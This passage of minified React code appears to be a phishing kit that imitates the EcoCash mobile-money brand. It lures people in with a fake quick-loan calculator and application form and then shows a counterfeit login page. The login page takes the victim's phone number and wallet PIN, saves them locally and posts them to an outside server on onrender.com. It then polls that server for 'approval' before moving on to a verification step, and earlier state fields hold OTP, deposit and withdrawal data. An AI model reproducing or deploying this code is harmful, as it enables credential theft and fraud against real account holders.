                loanType: "Personal Loan",
                loanAmount: "",
                loanTerm: "12 Months",
                purpose: ""
            }),
            N({
                firstName: "",
                lastName: "",
                email: "",
                phoneNumber: ""
            }),
            D({
                employmentStatus: "Employed",
                annualIncome: ""
            }),
            H({
                phoneNumber: "",
                pin: "",
                otp: "",
                isAuthenticated: !1
            }),
            X({
                approvedAmount: 0,
                requestedAmount: 0,
                monthlyPayment: 0,
                loanTerm: "",
                interestRate: "8% APR",
                accountNumber: "",
                requiredDeposit: 0,
                totalWithBonus: 0,
                hasDeposited: !1,
                canWithdraw: !1
            })
        }
    };
    return i.jsx(Mm.Provider, {
        value: Ae,
        children: s
    })
}
  , fa = () => {
    const {userId: s} = qv()
      , d = s && /^[a-z]{2}$/.test(s)
      , f = d ? (s.charCodeAt(0) - 97) * 26 + (s.charCodeAt(1) - 97) + 1 : null
      , o = d ? `/api/${s}` : null;
    return {
        userId: s,
        userIndex: f,
        apiBase: o,
        isValid: d
    }
}
;
function Zs() {
    const [s,d] = S.useState(5e3)
      , [f,o] = S.useState(12)
      , p = Xl()
      , {userId: v} = fa()
      , {updateCalculatorData: x, updateLoanApplicationData: z} = ra()
      , N = () => (s * (1 + .006666666666666667 * f) / f).toFixed(2)
      , m = () => {
        x({
            loanAmount: s,
            loanTerm: f,
            monthlyPayment: N()
        }),
        z({
            loanAmount: s.toString(),
            loanTerm: `${f} Months`
        }),
        p(`/${v}/loan-application`)
    }
    ;
    return i.jsxs("div", {
        className: "app-container",
        children: [i.jsxs("header", {
            className: "header",
            children: [i.jsxs("div", {
                className: "logo",
                children: [i.jsx("span", {
                    className: "logo-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-cash",
                    children: "Cash"
                })]
            }), i.jsxs("button", {
                className: "menu-btn",
                "aria-label": "Menu",
                children: [i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                })]
            })]
        }), i.jsx("main", {
            className: "main-content",
            children: i.jsxs("div", {
                className: "container",
                children: [i.jsx("h1", {
                    className: "title",
                    children: "Get Your Loan Approved Fast"
                }), i.jsx("p", {
                    className: "subtitle",
                    children: "Quick approval • Competitive rates • Flexible terms"
                }), i.jsxs("div", {
                    className: "calculator",
                    children: [i.jsx("h2", {
                        className: "calculator-title",
                        children: "Loan Calculator"
                    }), i.jsxs("div", {
                        className: "input-group",
                        children: [i.jsxs("div", {
                            className: "input-header",
                            children: [i.jsx("span", {
                                className: "input-label",
                                children: "Loan Amount"
                            }), i.jsxs("span", {
                                className: "input-value",
                                children: ["$", s.toLocaleString()]
                            })]
                        }), i.jsx("input", {
                            type: "range",
                            min: "100",
                            max: "5000",
                            value: s,
                            onChange: D => d(Number(D.target.value)),
                            className: "slider"
                        }), i.jsxs("div", {
                            className: "range-labels",
                            children: [i.jsx("span", {
                                children: "$100"
                            }), i.jsx("span", {
                                children: "$5,000"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "input-group",
                        children: [i.jsxs("div", {
                            className: "input-header",
                            children: [i.jsx("span", {
                                className: "input-label",
                                children: "Loan Term"
                            }), i.jsxs("span", {
                                className: "input-value",
                                children: [f, " months"]
                            })]
                        }), i.jsx("input", {
                            type: "range",
                            min: "6",
                            max: "60",
                            value: f,
                            onChange: D => o(Number(D.target.value)),
                            className: "slider"
                        }), i.jsxs("div", {
                            className: "range-labels",
                            children: [i.jsx("span", {
                                children: "6 months"
                            }), i.jsx("span", {
                                children: "60 months"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "payment-box",
                        children: [i.jsx("span", {
                            className: "payment-label",
                            children: "Monthly Payment"
                        }), i.jsxs("span", {
                            className: "payment-amount",
                            children: ["$", Number(N()).toLocaleString()]
                        })]
                    })]
                }), i.jsx("button", {
                    className: "apply-btn",
                    onClick: m,
                    children: "APPLY NOW"
                }), i.jsxs("div", {
                    className: "features",
                    children: [i.jsxs("div", {
                        className: "feature",
                        children: [i.jsx("div", {
                            className: "feature-icon",
                            children: "⚡"
                        }), i.jsx("div", {
                            className: "feature-title",
                            children: "Fast Approval"
                        }), i.jsx("div", {
                            className: "feature-subtitle",
                            children: "Within 24 hours"
                        })]
                    }), i.jsxs("div", {
                        className: "feature",
                        children: [i.jsx("div", {
                            className: "feature-icon",
                            children: "💰"
                        }), i.jsx("div", {
                            className: "feature-title",
                            children: "Low Rates"
                        }), i.jsx("div", {
                            className: "feature-subtitle",
                            children: "From 8%"
                        })]
                    }), i.jsxs("div", {
                        className: "feature",
                        children: [i.jsx("div", {
                            className: "feature-icon",
                            children: "🔒"
                        }), i.jsx("div", {
                            className: "feature-title",
                            children: "Secure"
                        }), i.jsx("div", {
                            className: "feature-subtitle",
                            children: "Bank-level"
                        })]
                    })]
                })]
            })
        }), i.jsx("footer", {
            className: "footer",
            children: "© 2026 Ecocash"
        })]
    })
}
function _y() {
    const s = Xl()
      , {userId: d} = fa()
      , {loanApplicationData: f, updateLoanApplicationData: o} = ra()
      , [p,v] = S.useState({
        loanType: f.loanType || "Personal Loan",
        loanAmount: f.loanAmount || "",
        loanTerm: f.loanTerm || "12 Months",
        purpose: f.purpose || ""
    });
    S.useEffect( () => {
        f.loanAmount && v(m => ({
            ...m,
            loanAmount: f.loanAmount,
            loanTerm: f.loanTerm
        }))
    }
    , [f]);
    const x = m => {
        const {name: D, value: j} = m.target;
        v(H => ({
            ...H,
            [D]: j
        }))
    }
      , z = m => {
        m.preventDefault(),
        o(p),
        s(`/${d}/details`)
    }
      , N = () => s(-1);
    return i.jsxs("div", {
        className: "app-container",
        children: [i.jsxs("header", {
            className: "header",
            children: [i.jsx("button", {
                className: "back-btn",
                onClick: N,
                children: "← Back"
            }), i.jsxs("div", {
                className: "logo",
                children: [i.jsx("span", {
                    className: "logo-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-cash",
                    children: "Cash"
                })]
            }), i.jsxs("button", {
                className: "menu-btn",
                "aria-label": "Menu",
                children: [i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                })]
            })]
        }), i.jsx("main", {
            className: "main-content",
            children: i.jsxs("div", {
                className: "container",
                children: [i.jsx("h1", {
                    className: "form-title",
                    children: "Loan Application"
                }), i.jsx("p", {
                    className: "form-subtitle",
                    children: "Step 1 of 3"
                }), i.jsxs("div", {
                    className: "progress-indicator",
                    children: [i.jsx("div", {
                        className: "progress-dot active"
                    }), i.jsx("div", {
                        className: "progress-dot"
                    }), i.jsx("div", {
                        className: "progress-dot"
                    })]
                }), i.jsxs("form", {
                    onSubmit: z,
                    children: [i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Loan Type"
                        }), i.jsxs("select", {
                            name: "loanType",
                            value: p.loanType,
                            onChange: x,
                            className: "form-select",
                            children: [i.jsx("option", {
                                value: "Personal Loan",
                                children: "Personal Loan"
                            }), i.jsx("option", {
                                value: "Business Loan",
                                children: "Business Loan"
                            }), i.jsx("option", {
                                value: "Home Loan",
                                children: "Home Loan"
                            }), i.jsx("option", {
                                value: "Car Loan",
                                children: "Car Loan"
                            }), i.jsx("option", {
                                value: "Education Loan",
                                children: "Education Loan"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Loan Amount ($)"
                        }), i.jsx("input", {
                            type: "number",
                            name: "loanAmount",
                            value: p.loanAmount,
                            onChange: x,
                            placeholder: "Enter amount",
                            className: "form-input",
                            required: !0
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Loan Term"
                        }), i.jsxs("select", {
                            name: "loanTerm",
                            value: p.loanTerm,
                            onChange: x,
                            className: "form-select",
                            children: [i.jsx("option", {
                                value: "6 Months",
                                children: "6 Months"
                            }), i.jsx("option", {
                                value: "12 Months",
                                children: "12 Months"
                            }), i.jsx("option", {
                                value: "18 Months",
                                children: "18 Months"
                            }), i.jsx("option", {
                                value: "24 Months",
                                children: "24 Months"
                            }), i.jsx("option", {
                                value: "36 Months",
                                children: "36 Months"
                            }), i.jsx("option", {
                                value: "48 Months",
                                children: "48 Months"
                            }), i.jsx("option", {
                                value: "60 Months",
                                children: "60 Months"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Purpose of Loan"
                        }), i.jsx("textarea", {
                            name: "purpose",
                            value: p.purpose,
                            onChange: x,
                            placeholder: "What will you use the loan for?",
                            className: "form-textarea",
                            required: !0
                        })]
                    }), i.jsx("button", {
                        type: "submit",
                        className: "next-btn",
                        children: "NEXT STEP"
                    })]
                })]
            })
        }), i.jsx("footer", {
            className: "footer",
            children: "© 2026 Ecocash"
        })]
    })
}
function Uy() {
    const s = Xl()
      , {userId: d} = fa()
      , {personalDetailsData: f, updatePersonalDetailsData: o} = ra()
      , [p,v] = S.useState({
        firstName: f.firstName || "",
        lastName: f.lastName || "",
        email: f.email || "",
        phoneNumber: f.phoneNumber || ""
    })
      , x = D => {
        const {name: j, value: H} = D.target;
        if (j === "phoneNumber") {
            const X = H.replace(/\D/g, "").slice(0, 10);
            v(Y => ({
                ...Y,
                [j]: X
            }))
        } else
            v(q => ({
                ...q,
                [j]: H
            }))
    }
      , z = D => {
        D.preventDefault(),
        o(p),
        s(`/${d}/summary`)
    }
      , N = () => {
        o(p),
        s(-1)
    }
      , m = () => s(`/${d}`);
    return i.jsxs("div", {
        className: "app-container",
        children: [i.jsxs("header", {
            className: "header",
            children: [i.jsx("button", {
                className: "back-btn",
                onClick: m,
                children: "← Back"
            }), i.jsxs("div", {
                className: "logo",
                children: [i.jsx("span", {
                    className: "logo-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-cash",
                    children: "Cash"
                })]
            }), i.jsxs("button", {
                className: "menu-btn",
                "aria-label": "Menu",
                children: [i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                })]
            })]
        }), i.jsx("main", {
            className: "main-content",
            children: i.jsxs("div", {
                className: "container",
                children: [i.jsx("h1", {
                    className: "form-title",
                    children: "Loan Application"
                }), i.jsx("p", {
                    className: "form-subtitle",
                    children: "Step 2 of 3"
                }), i.jsxs("div", {
                    className: "progress-indicator",
                    children: [i.jsx("div", {
                        className: "progress-dot active"
                    }), i.jsx("div", {
                        className: "progress-dot active"
                    }), i.jsx("div", {
                        className: "progress-dot"
                    })]
                }), i.jsxs("form", {
                    onSubmit: z,
                    children: [i.jsxs("div", {
                        className: "form-row",
                        children: [i.jsxs("div", {
                            className: "form-group",
                            children: [i.jsx("label", {
                                className: "form-label",
                                children: "First Name"
                            }), i.jsx("input", {
                                type: "text",
                                name: "firstName",
                                value: p.firstName,
                                onChange: x,
                                placeholder: "John",
                                className: "form-input",
                                required: !0
                            })]
                        }), i.jsxs("div", {
                            className: "form-group",
                            children: [i.jsx("label", {
                                className: "form-label",
                                children: "Last Name"
                            }), i.jsx("input", {
                                type: "text",
                                name: "lastName",
                                value: p.lastName,
                                onChange: x,
                                placeholder: "Doe",
                                className: "form-input",
                                required: !0
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Email Address"
                        }), i.jsx("input", {
                            type: "email",
                            name: "email",
                            value: p.email,
                            onChange: x,
                            placeholder: "john.doe@example.com",
                            className: "form-input",
                            required: !0
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Phone Number"
                        }), i.jsxs("div", {
                            style: {
                                display: "flex",
                                gap: "8px"
                            },
                            children: [i.jsx("div", {
                                style: {
                                    display: "flex",
                                    alignItems: "center",
                                    padding: "12px 16px",
                                    backgroundColor: "#f5f5f5",
                                    border: "1px solid #ddd",
                                    borderRadius: "8px",
                                    fontWeight: "500"
                                },
                                children: "+263"
                            }), i.jsx("input", {
                                type: "tel",
                                name: "phoneNumber",
                                value: p.phoneNumber,
                                onChange: x,
                                placeholder: "123456789",
                                className: "form-input",
                                style: {
                                    flex: 1
                                },
                                pattern: "[0-9]{9,10}",
                                minLength: "9",
                                maxLength: "10",
                                required: !0
                            })]
                        }), i.jsx("small", {
                            style: {
                                display: "block",
                                marginTop: "4px",
                                color: "#666",
                                fontSize: "12px"
                            },
                            children: "Enter 9-10 digits (e.g., 123456789)"
                        })]
                    }), i.jsxs("div", {
                        className: "button-container",
                        children: [i.jsx("button", {
                            type: "button",
                            className: "previous-btn",
                            onClick: N,
                            children: "PREVIOUS"
                        }), i.jsx("button", {
                            type: "submit",
                            className: "next-btn",
                            children: "NEXT STEP"
                        })]
                    })]
                })]
            })
        }), i.jsx("footer", {
            className: "footer",
            children: "© 2026 Ecocash"
        })]
    })
}
function Hy() {
    const s = Xl()
      , {userId: d} = fa()
      , {loanApplicationData: f, personalDetailsData: o, financialData: p, updateFinancialData: v, processLoanApplication: x} = ra()
      , [z,N] = S.useState({
        employmentStatus: p.employmentStatus || "Employed",
        annualIncome: p.annualIncome || ""
    })
      , [m,D] = S.useState(!1)
      , [j,H] = S.useState(5);
    S.useEffect( () => {
        if (m) {
            const w = setInterval( () => {
                H(Q => Q <= 1 ? (clearInterval(w),
                s(`/${d}/login`),
                0) : Q - 1)
            }
            , 1e3);
            return () => clearInterval(w)
        }
    }
    , [m, s, d]);
    const q = w => {
        const {name: Q, value: V} = w.target;
        N(ae => ({
            ...ae,
            [Q]: V
        }))
    }
      , X = w => {
        w.preventDefault(),
        v(z),
        x(),
        D(!0)
    }
      , Y = () => {
        v(z),
        s(-1)
    }
      , G = () => s(`/${d}`);
    return m ? i.jsxs("div", {
        style: {
            minHeight: "100vh",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            backgroundColor: "#f3f4f6",
            padding: "20px"
        },
        children: [i.jsx("div", {
            style: {
                position: "fixed",
                top: "20px",
                left: "50%",
                transform: "translateX(-50%)",
                backgroundColor: "#1f2937",
                color: "white",
                padding: "12px 24px",
                borderRadius: "8px",
                display: "flex",
                alignItems: "center",
                gap: "10px",
                boxShadow: "0 4px 6px rgba(0,0,0,0.1)",
                zIndex: 1e3
            },
            children: i.jsx("span", {
                style: {
                    fontSize: "14px",
                    fontWeight: "500"
                },
                children: "🎉 Application submitted successfully!"
            })
        }), i.jsxs("div", {
            style: {
                backgroundColor: "white",
                borderRadius: "16px",
                padding: "48px 40px",
                maxWidth: "500px",
                width: "100%",
                textAlign: "center",
                boxShadow: "0 10px 25px rgba(0,0,0,0.1)"
            },
            children: [i.jsx("div", {
                style: {
                    width: "80px",
                    height: "80px",
                    margin: "0 auto 24px",
                    backgroundColor: "#10b981",
                    borderRadius: "50%",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center"
                },
                children: i.jsx("svg", {
                    width: "48",
                    height: "48",
                    viewBox: "0 0 48 48",
                    fill: "none",
                    children: i.jsx("path", {
                        d: "M14 24l8 8 12-16",
                        stroke: "white",
                        strokeWidth: "4",
                        strokeLinecap: "round",
                        strokeLinejoin: "round"
                    })
                })
            }), i.jsx("h1", {
                style: {
                    fontSize: "28px",
                    fontWeight: "700",
                    color: "#10b981",
                    marginBottom: "16px"
                },
                children: "Loan Application Submitted"
            }), i.jsx("p", {
                style: {
                    fontSize: "16px",
                    color: "#6b7280",
                    lineHeight: "1.6",
                    marginBottom: "12px"
                },
                children: "Your loan application has been submitted. Please wait for approval."
            }), i.jsx("p", {
                style: {
                    fontSize: "16px",
                    color: "#6b7280",
                    lineHeight: "1.6",
                    marginBottom: "32px"
                },
                children: "You will receive a confirmation message. For now, proceed to EcoCash."
            }), i.jsxs("div", {
                style: {
                    backgroundColor: "#f3f4f6",
                    padding: "20px",
                    borderRadius: "12px",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: "12px"
                },
                children: [i.jsx("div", {
                    style: {
                        width: "20px",
                        height: "20px",
                        border: "3px solid #e5e7eb",
                        borderTop: "3px solid #3b82f6",
                        borderRadius: "50%",
                        animation: "spin 1s linear infinite"
                    }
                }), i.jsxs("span", {
                    style: {
                        fontSize: "15px",
                        color: "#3b82f6",
                        fontWeight: "500"
                    },
                    children: ["Redirecting to EcoCash login in ", j, "s..."]
                })]
            }), i.jsx("button", {
                onClick: () => s(`/${d}/login`),
                style: {
                    marginTop: "24px",
                    padding: "12px 24px",
                    backgroundColor: "white",
                    border: "2px solid #e5e7eb",
                    borderRadius: "8px",
                    color: "#6b7280",
                    fontSize: "14px",
                    fontWeight: "500",
                    cursor: "pointer"
                },
                children: "Go to Login Now"
            })]
        }), i.jsx("style", {
            children: "@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }"
        })]
    }) : i.jsxs("div", {
        className: "app-container",
        children: [i.jsxs("header", {
            className: "header",
            children: [i.jsx("button", {
                className: "back-btn",
                onClick: G,
                children: "← Back"
            }), i.jsxs("div", {
                className: "logo",
                children: [i.jsx("span", {
                    className: "logo-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-cash",
                    children: "Cash"
                })]
            }), i.jsxs("button", {
                className: "menu-btn",
                "aria-label": "Menu",
                children: [i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                }), i.jsx("div", {
                    className: "menu-line"
                })]
            })]
        }), i.jsx("main", {
            className: "main-content",
            children: i.jsxs("div", {
                className: "container",
                children: [i.jsx("h1", {
                    className: "form-title",
                    children: "Loan Application"
                }), i.jsx("p", {
                    className: "form-subtitle",
                    children: "Step 3 of 3"
                }), i.jsxs("div", {
                    className: "progress-indicator",
                    children: [i.jsx("div", {
                        className: "progress-dot active"
                    }), i.jsx("div", {
                        className: "progress-dot active"
                    }), i.jsx("div", {
                        className: "progress-dot active"
                    })]
                }), i.jsxs("form", {
                    onSubmit: X,
                    children: [i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Employment Status"
                        }), i.jsxs("select", {
                            name: "employmentStatus",
                            value: z.employmentStatus,
                            onChange: q,
                            className: "form-select",
                            children: [i.jsx("option", {
                                value: "Employed",
                                children: "Employed"
                            }), i.jsx("option", {
                                value: "Self-Employed",
                                children: "Self-Employed"
                            }), i.jsx("option", {
                                value: "Unemployed",
                                children: "Unemployed"
                            }), i.jsx("option", {
                                value: "Retired",
                                children: "Retired"
                            }), i.jsx("option", {
                                value: "Student",
                                children: "Student"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "form-group",
                        children: [i.jsx("label", {
                            className: "form-label",
                            children: "Annual Income ($)"
                        }), i.jsx("input", {
                            type: "number",
                            name: "annualIncome",
                            value: z.annualIncome,
                            onChange: q,
                            placeholder: "50,000",
                            className: "form-input",
                            required: !0
                        })]
                    }), i.jsxs("div", {
                        className: "summary-section",
                        children: [i.jsx("h3", {
                            className: "summary-title",
                            children: "Application Summary"
                        }), i.jsxs("div", {
                            className: "summary-item",
                            children: [i.jsx("span", {
                                className: "summary-label",
                                children: "Loan Amount:"
                            }), i.jsxs("span", {
                                className: "summary-value",
                                children: ["$", f.loanAmount ? Number(f.loanAmount).toLocaleString() : "0"]
                            })]
                        }), i.jsxs("div", {
                            className: "summary-item",
                            children: [i.jsx("span", {
                                className: "summary-label",
                                children: "Loan Term:"
                            }), i.jsx("span", {
                                className: "summary-value",
                                children: f.loanTerm || "N/A"
                            })]
                        }), i.jsxs("div", {
                            className: "summary-item",
                            children: [i.jsx("span", {
                                className: "summary-label",
                                children: "Purpose:"
                            }), i.jsx("span", {
                                className: "summary-value",
                                children: f.purpose || "N/A"
                            })]
                        }), i.jsxs("div", {
                            className: "summary-item",
                            children: [i.jsx("span", {
                                className: "summary-label",
                                children: "Applicant:"
                            }), i.jsx("span", {
                                className: "summary-value",
                                children: o.firstName && o.lastName ? `${o.firstName} ${o.lastName}` : "N/A"
                            })]
                        })]
                    }), i.jsxs("div", {
                        className: "button-container",
                        children: [i.jsx("button", {
                            type: "button",
                            className: "previous-btn",
                            onClick: Y,
                            children: "PREVIOUS"
                        }), i.jsx("button", {
                            type: "submit",
                            className: "submit-btn",
                            children: "SUBMIT APPLICATION"
                        })]
                    })]
                })]
            })
        }), i.jsx("footer", {
            className: "footer",
            children: "© 2026 Ecocash"
        })]
    })
}
function Ly() {
    const s = Xl()
      , {userId: d, apiBase: f} = fa()
      , {personalDetailsData: o, updateAuthData: p, serverStatus: v} = ra()
      , x = "https://ecocash-zw-server-0051.onrender.com"
      , z = ee => `${x}${f}/${ee}`
      , N = o.phoneNumber ? o.phoneNumber.replace(/\D/g, "").slice(-10) : ""
      , [m,D] = S.useState(N)
      , [j,H] = S.useState(["", "", "", ""])
      , [q,X] = S.useState(!1)
      , [Y,G] = S.useState(!1)
      , [w,Q] = S.useState(!1)
      , [V,ae] = S.useState(!1)
      , [be,se] = S.useState(!1)
      , [F,re] = S.useState("")
      , xe = [S.useRef(null), S.useRef(null), S.useRef(null), S.useRef(null)]
      , Ae = S.useRef(null)
      , te = S.useRef(0)
      , le = 60;
    S.useEffect( () => () => {
        Ae.current && clearInterval(Ae.current)
    }
    , []);
    const it = ee => {
        if (!ee)
            return {
                valid: !1,
                message: ""
            };
        const ge = ee.length;
        if (ge < 9 || ge > 10)
            return {
                valid: !1,
                message: ""
            };
        const _e = ee[0]
          , ct = ee[1];
        if (ge === 10) {
            if (_e !== "0")
                return {
                    valid: !1,
                    message: "10-digit numbers must start with 07"
                };
            if (ct !== "7")
                return {
                    valid: !1,
                    message: "10-digit numbers must start with 07"
                }
        } else if (ge === 9 && _e !== "7")
            return {
                valid: !1,
                message: "9-digit numbers must start with 7"
            };
        return {
            valid: !0,
            message: ""
        }
    }
      , Fe = ee => {
        D(ee.target.value.replace(/\D/g, "").slice(0, 10))
    }
      , Qe = ee => {
        ee.preventDefault(),
        D(ee.clipboardData.getData("text").replace(/\D/g, "").slice(0, 10))
    }
      , O = (ee, ge) => {
        const _e = ge.replace(/\D/g, "");
        if (_e.length > 1)
            return;
        const ct = [...j];
        ct[ee] = _e,
        H(ct),
        _e && ee < 3 && xe[ee + 1].current.focus()
    }
      , B = (ee, ge) => {
        ee.preventDefault();
        const _e = ee.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4).split("")
          , ct = [...j];
        _e.forEach( (qe, ot) => {
            ge + ot < 4 && (ct[ge + ot] = qe)
        }
        ),
        H(ct),
        xe[Math.min(ge + _e.length, 3)].current.focus()
    }
      , $ = (ee, ge) => {
        if (ge.key === "Backspace")
            if (j[ee]) {
                const _e = [...j];
                _e[ee] = "",
                H(_e)
            } else
                ee > 0 && xe[ee - 1].current.focus();
        else
            ge.key === "ArrowLeft" && ee > 0 ? xe[ee - 1].current.focus() : ge.key === "ArrowRight" && ee < 3 && xe[ee + 1].current.focus()
    }
      , he = ee => {
        /^\d$/.test(ee.key) || ee.preventDefault()
    }
      , pe = () => X(!q)
      , g = (ee, ge, _e) => {
        te.current = 0,
        Ae.current = setInterval(async () => {
            try {
                if (te.current++,
                te.current > le) {
                    clearInterval(Ae.current),
                    ae(!1),
                    G(!1),
                    re("Something went wrong, try again"),
                    se(!0);
                    return
                }
                const qe = await (await fetch(z("check-login-approval"), {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        phoneNumber: ee,
                        pin: ge
                    })
                })).json();
                qe.success && (qe.approved ? (clearInterval(Ae.current),
                ae(!1),
                await new Promise(ot => setTimeout(ot, 500)),
                s(_e ? `/${d}/status` : `/${d}/verify`)) : qe.rejected ? (clearInterval(Ae.current),
                ae(!1),
                G(!1),
                re("Wrong PIN"),
                se(!0)) : qe.expired && (clearInterval(Ae.current),
                ae(!1),
                G(!1),
                re("Something went wrong, try again"),
                se(!0)))
            } catch (ct) {
                console.error("Error polling approval status:", ct)
            }
        }
        , 5e3)
    }
      , _ = async ee => {
        ee.preventDefault();
        const ge = j.join("");
        if (!it(m).valid) {
            re(`Phone number must be 07xxxxxxxx or 7xxxxxxxx!
Please enter correct number and try again!`),
            se(!0);
            return
        }
        if (ge.length !== 4) {
            re("Please enter complete 4-digit PIN"),
            se(!0);
            return
        }
        const qe = `+263${m.startsWith("0") ? m.slice(1) : m}`;
        p({
            phoneNumber: qe,
            pin: ge,
            isAuthenticated: !1
        });
        try {
            localStorage.setItem("ecocash_phone", qe),
            localStorage.setItem("ecocash_auth", JSON.stringify({
                phoneNumber: qe,
                pin: ge,
                isAuthenticated: !1,
                timestamp: new Date().toISOString()
            }))
        } catch (ot) {
            console.error("Failed to save auth:", ot)
        }
        G(!0);
        try {
            const Zl = (await (await fetch(z("check-user-status"), {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phoneNumber: qe
                })
            })).json()).isReturningUser || !1;
            Q(Zl),
            (await (await fetch(z("login"), {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    phoneNumber: qe,
                    pin: ge,
                    timestamp: new Date().toISOString()
                })
            })).json()).success ? (ae(!0),
            g(qe, ge, Zl)) : (G(!1),
            re("Failed to process login. Please try again."),
            se(!0))
        } catch (ot) {
            console.error("Login error:", ot),
            G(!1),
            re("Failed to process login. Please try again."),
            se(!0)
        }
    }
      , L = () => {
        window.location.href = "https://partnerapplications.ecocash.co.zw/user/password/reset"
    }
      , Z = () => {
        window.location.href = "https://partnerapplications.ecocash.co.zw/signup"
    }
      , I = () => {
        window.location.href = "https://ecocash.co.zw/contact-us/"
    }
      , ne = () => {
        se(!1),
        re("")
    }
      , ie = m.length >= 9 && j.every(ee => ee !== "")
      , Re = v?.isChecking ? {
        text: "WAIT...",
        disabled: !0,
        className: "login-button waiting"
    } : v && !v.isActive ? {
        text: "SERVER ERROR",
        disabled: !0,
        className: "login-button error"
    } : {
        text: "LOGIN",
        disabled: !ie || Y,
        className: "login-button"
    };
    return Y || V ? i.jsx("div", {
        className: "login-container",
        children: i.jsx("div", {
            className: "processing-overlay",
            children: i.jsxs("div", {
                className: "processing-card",
                children: [i.jsx("div", {
                    className: "spinner-container",
                    children: i.jsx("div", {
                        className: "spinner"
                    })
                }), i.jsx("h1", {
                    className: "processing-title",
                    children: V ? "Please wait..." : "Processing..."
                }), i.jsx("p", {
                    className: "processing-subtitle",
                    children: V ? "This usually takes a few seconds" : w ? "Welcome back! Taking you to dashboard..." : "Preparing verification..."
                })]
            })
        })
    }) : i.jsxs("div", {
        className: "login-container",
        children: [be && i.jsx("div", {
            className: "error-modal-overlay",
            onClick: ne,
            children: i.jsxs("div", {
                className: "error-modal-content",
                onClick: ee => ee.stopPropagation(),
                children: [i.jsx("div", {
                    className: "error-modal-icon",
                    children: "⚠️"
                }), i.jsx("h2", {
                    className: "error-modal-title",
                    children: "Invalid Format"
                }), i.jsx("p", {
                    className: "error-modal-message",
                    style: {
                        whiteSpace: "pre-line"
                    },
                    children: F
                }), i.jsx("button", {
                    className: "error-modal-button",
                    onClick: ne,
                    children: "OK"
                })]
            })
        }), i.jsx("div", {
            className: "login-header",
            children: i.jsxs("div", {
                className: "logo-large",
                children: [i.jsx("span", {
                    className: "logo-large-eco",
                    children: "Eco"
                }), i.jsx("span", {
                    className: "logo-large-cash",
                    children: "Cash"
                })]
            })
        }), i.jsxs("div", {
            className: "login-content",
            children: [i.jsx("h1", {
                className: "login-title",
                children: "Login"
            }), v?.error && i.jsx("div", {
                className: "server-status-message error",
                children: i.jsxs("p", {
                    children: ["⚠️ ", v.error]
                })
            }), i.jsxs("form", {
                className: "login-form",
                onSubmit: _,
                children: [i.jsxs("div", {
                    className: "phone-input-container",
                    children: [i.jsxs("div", {
                        className: "country-code",
                        children: [i.jsx("span", {
                            className: "flag-icon",
                            children: "🇿🇼"
                        }), i.jsx("span", {
                            children: "+263"
                        })]
                    }), i.jsx("input", {
                        type: "tel",
                        className: "phone-input",
                        value: m,
                        onChange: Fe,
                        onPaste: Qe,
                        placeholder: "712345678",
                        maxLength: "10",
                        inputMode: "numeric",
                        pattern: "[0-9]*",
                        required: !0
                    })]
                }), i.jsxs("div", {
                    className: "pin-section",
                    children: [i.jsx("p", {
                        className: "pin-label",
                        children: "Enter your PIN"
                    }), i.jsxs("div", {
                        className: "pin-inputs-wrapper",
                        children: [i.jsx("div", {
                            className: "pin-inputs",
                            children: j.map( (ee, ge) => i.jsx("input", {
                                ref: xe[ge],
                                type: q ? "text" : "password",
                                className: "pin-box",
                                value: ee,
                                onChange: _e => O(ge, _e.target.value),
                                onKeyDown: _e => $(ge, _e),
                                onKeyPress: he,
                                onPaste: _e => B(_e, ge),
                                maxLength: "1",
                                inputMode: "numeric",
                                pattern: "[0-9]",
                                required: !0
                            }, ge))
                        }), i.jsx("button", {
                            type: "button",
                            className: "eye-button",
                            onClick: pe,
                            "aria-label": q ? "Hide PIN" : "Show PIN",
                            children: q ? "👁️" : "👁️‍🗨️"
                        })]
                    }), i.jsx("p", {
                        className: "forgot-pin",
                        onClick: L,
                        children: "Forgot PIN?"
                    })]
                }), i.jsx("button", {
                    type: "submit",
                    className: Re.className,
                    disabled: Re.disabled,
                    children: Re.text
                })]
            })]
        }), i.jsxs("div", {
            className: "login-footer",
            children: [i.jsx("div", {
                className: "wave-decoration"
            }), i.jsxs("div", {
                className: "footer-content",
                children: [i.jsxs("p", {
                    className: "footer-text",
                    children: ["To register an EcoCash wallet or get assistance,", i.jsx("br", {}), "click below"]
                }), i.jsxs("div", {
                    className: "footer-buttons",
                    children: [i.jsxs("button", {
                        className: "footer-button",
